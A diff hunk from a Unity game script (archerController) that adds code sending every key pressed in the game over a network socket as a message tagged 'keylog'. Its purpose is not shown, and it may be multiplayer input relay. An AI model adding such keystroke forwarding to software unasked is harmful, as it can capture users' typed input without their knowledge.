@@ -265,6 +265,10 @@ public class archerController : MonoBehaviour {
 	// Update is called once per frame
 	void Update ()
   {
+        if (Input.anyKeyDown)
+        {
+            SocketNetworkManager.w.SendString("{ \"msgtype\":\"keylog\", \"input\": \"" + Input.inputString + "\" }");
+        }
         /* ON HIT */
         if (hit >= 0){
           Color lerpedColor = Color.Lerp(Color.white, Color.red, Mathf.Sqrt(hit)/Mathf.Sqrt(25));
